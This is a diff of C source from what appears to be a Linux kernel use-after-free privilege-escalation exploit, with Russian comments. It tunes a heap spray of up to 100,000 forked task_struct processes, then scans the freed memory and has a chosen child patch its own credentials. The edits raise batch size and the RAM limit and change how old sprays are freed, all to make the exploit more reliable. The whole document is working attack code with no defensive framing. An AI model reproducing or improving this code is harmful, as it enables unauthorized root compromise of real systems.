@@ -2650,7 +2650,7 @@ restart:;
 
     fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 100,000)\n");
     int total_limit = 100000;
-    int batch_size = 200; // Немного увеличим батч для скорости
+    int batch_size = 2000; // Увеличили батч для более плотного спрея
     int total_sprayed = 0;
     int marker_found_global = 0;
     int window_idx = 0;
@@ -2659,27 +2659,32 @@ restart:;
         double ram_usage = get_ram_usage_percentage();
         fprintf(stderr, "\r    [*] Sprayed: %d | RAM Usage: %.1f%% ... ", total_sprayed, ram_usage);
         
-        // Увеличиваем порог до 85%, так как у пользователя база >50%
-        int reached_mem_limit = (ram_usage > 85.0);
+        int reached_mem_limit = (ram_usage > 90.0); // Подняли до 90%
         
-        // Если памяти хватает ИЛИ это самый первый батч, спреим
         if (!reached_mem_limit || total_sprayed == 0) {
             for (int i = 0; i < batch_size && total_sprayed < total_limit; i++) {
                 pid_t pid = fork();
                 if (pid == 0) {
+                    // Оптимизация ребенка: закрываем лишние файлы
+                    if (fd_lib > 0) close(fd_lib);
+                    if (fd_shellcode > 0) close(fd_shellcode);
+                    
                     char proc_name[16];
                     snprintf(proc_name, sizeof(proc_name), "%s%05d", MARKER_NAME, getpid());
                     prctl(PR_SET_NAME, proc_name, 0, 0, 0);
                     prctl(PR_SET_PDEATHSIG, SIGKILL);
+                    
+                    // Ребенок просто спит и ждет команды через общую память
                     while(1) { 
                         if (gbuf[0] == 0xab) {
                             if (getpid() == (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID])) {
                                 safe_cred_patch();
                             }
                         }
-                        usleep(100000); 
+                        // Большой интервал сна, чтобы не грузить CPU
+                        usleep(500000); 
                     }
-                    exit(0);
+                    _exit(0);
                 }
                 if (pid > 0) {
                     spray_ctrl[total_sprayed].pid = pid;
@@ -2687,16 +2692,14 @@ restart:;
                     total_sprayed++;
                 }
             }
-            usleep(10000); // Даем системе время
+            // Короткая пауза после большой пачки
+            usleep(20000); 
         }
 
-        // Сканируем, если:
-        // 1. Достигли лимита памяти
-        // 2. Наспреили достаточно (кратно 1000)
-        // 3. Или это конец спрея
-        if (reached_mem_limit || (total_sprayed > 0 && total_sprayed % 1000 == 0) || total_sprayed >= total_limit) {
+        // Сканируем чаще (каждые 2000 или по лимиту памяти)
+        if (reached_mem_limit || (total_sprayed > 0 && total_sprayed % 2000 == 0) || total_sprayed >= total_limit) {
             fprintf(stderr, "\n    [!] %s. Starting scan (Window %d)...\n", 
-                    reached_mem_limit ? "Memory limit (85%) reached" : "Batch complete", window_idx);
+                    reached_mem_limit ? "Memory limit (90%) reached" : "Batch complete", window_idx);
             
             int num_found = 0;
             if (scan_uaf_for_nonzero_multi(fd, window_idx++, &num_found)) {
@@ -2705,33 +2708,19 @@ restart:;
                 break; 
             }
             
-            // Если памяти мало, чистим старый спрей, чтобы освободить место для нового
             if (reached_mem_limit) {
-                fprintf(stderr, "\n    [-] Cleaning up old sprays to free RAM (Target: 85%%)...\n");
-                for (int i = 0; i < total_sprayed; i++) {
+                fprintf(stderr, "\n    [-] RAM high (%.1f%%). Freeing 50%% of oldest sprays...\n", ram_usage);
+                int kill_count = total_sprayed / 2;
+                for (int i = 0; i < kill_count; i++) {
                     if (spray_ctrl[i].pid > 0) {
-                        pid_t target_pid = (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID]);
-                        if (spray_ctrl[i].pid != target_pid) {
-                            kill(spray_ctrl[i].pid, SIGKILL);
-                            waitpid(spray_ctrl[i].pid, NULL, 0);
-                        }
+                        kill(spray_ctrl[i].pid, SIGKILL);
+                        waitpid(spray_ctrl[i].pid, NULL, 0);
                         spray_ctrl[i].pid = 0;
                     }
                 }
                 reap_all_children();
-                // Мы НЕ сбрасываем total_sprayed, чтобы продолжить спрей с новыми именами/PID
-                // Но фактически в памяти теперь 0 маркеров, поэтому спрей начнется "заново" по сути
-                // Но мы сдвигаем окно сканирования (window_idx уже инкрементирован)
                 usleep(500000);
             }
-        }
-        
-        // Если мы ВООБЩЕ не можем спреить из-за RAM, просто сканируем разные окна
-        if (total_sprayed == 0 && reached_mem_limit) {
-            fprintf(stderr, "\n    [!] Baseline RAM too high. Scanning without spray...\n");
-            int num_found = 0;
-            scan_uaf_for_nonzero_multi(fd, window_idx++, &num_found);
-            sleep(1);
         }
     }
 
